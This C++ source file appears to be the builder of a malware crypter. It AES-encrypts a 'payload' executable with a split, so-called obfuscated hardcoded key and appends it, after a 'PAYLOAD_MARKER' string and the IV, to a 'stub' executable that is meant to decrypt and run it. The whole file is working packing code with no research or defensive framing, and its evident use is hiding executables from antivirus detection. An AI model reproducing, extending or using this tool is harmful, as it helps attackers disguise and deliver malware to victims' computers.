#include <iostream>
#include <fstream>
#include <vector>
#include <cstring>
#include <cstdint>
#include "plusaes/plusaes.hpp"

#if defined(_WIN32)
#include <windows.h>
#include <wincrypt.h>
#endif

// Obfuscated AES key (must match the key in the stub)
const std::vector<uint8_t> key_part1 = { 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF };
const std::vector<uint8_t> key_part2 = { 0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32, 0x10 };
const std::vector<uint8_t> key_part3 = { 0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF };
const std::vector<uint8_t> key_part4 = { 0xCA, 0xFE, 0xBA, 0xBE, 0xCA, 0xFE, 0xBA, 0xBE };

std::vector<uint8_t> get_key() {
    std::vector<uint8_t> key;
    key.insert(key.end(), key_part1.begin(), key_part1.end());
    key.insert(key.end(), key_part2.begin(), key_part2.end());
    key.insert(key.end(), key_part3.begin(), key_part3.end());
    key.insert(key.end(), key_part4.begin(), key_part4.end());
    return key;
}

void generate_random_iv(unsigned char* iv) {
#if defined(_WIN32)
    HCRYPTPROV hCryptProv;
    CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
    CryptGenRandom(hCryptProv, 16, iv);
    CryptReleaseContext(hCryptProv, 0);
#else
    std::ifstream urandom("/dev/urandom", std::ios::in | std::ios::binary);
    urandom.read((char*)iv, 16);
    urandom.close();
#endif
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " <stub_exe> <payload_exe> <output_exe>" << std::endl;
        return 1;
    }

    const char* stub_path = argv[1];
    const char* payload_path = argv[2];
    const char* output_path = argv[3];

    // Read the stub executable
    std::ifstream stub_file(stub_path, std::ios::binary);
    if (!stub_file) {
        std::cerr << "Error: Could not open stub file." << std::endl;
        return 1;
    }
    std::vector<uint8_t> stub_buffer(std::istreambuf_iterator<char>(stub_file), {});
    stub_file.close();

    // Read the payload executable
    std::ifstream payload_file(payload_path, std::ios::binary);
    if (!payload_file) {
        std::cerr << "Error: Could not open payload file." << std::endl;
        return 1;
    }
    std::vector<uint8_t> payload_buffer(std::istreambuf_iterator<char>(payload_file), {});
    payload_file.close();

    // Generate a random 16-byte IV
    unsigned char iv[16];
    generate_random_iv(iv);

    // Encrypt the payload using AES-256-CBC
    const std::vector<uint8_t> key = get_key();
    const unsigned long encrypted_size = plusaes::get_padded_encrypted_size(payload_buffer.size());
    std::vector<unsigned char> encrypted(encrypted_size);
    plusaes::encrypt_cbc(payload_buffer.data(), payload_buffer.size(), key.data(), key.size(), &iv, encrypted.data(), encrypted.size(), true);

    // Add a marker to separate the stub from the payload
    const char* marker = "PAYLOAD_MARKER";
    stub_buffer.insert(stub_buffer.end(), marker, marker + strlen(marker));

    // Append the IV and the encrypted payload to the stub
    stub_buffer.insert(stub_buffer.end(), iv, iv + 16);
    stub_buffer.insert(stub_buffer.end(), encrypted.begin(), encrypted.end());

    // Write the output file
    std::ofstream output_file(output_path, std::ios::binary);
    if (!output_file) {
        std::cerr << "Error: Could not open output file." << std::endl;
        return 1;
    }
    output_file.write(reinterpret_cast<const char*>(stub_buffer.data()), stub_buffer.size());
    output_file.close();

    std::cout << "Successfully created " << output_path << std::endl;

    return 0;
}
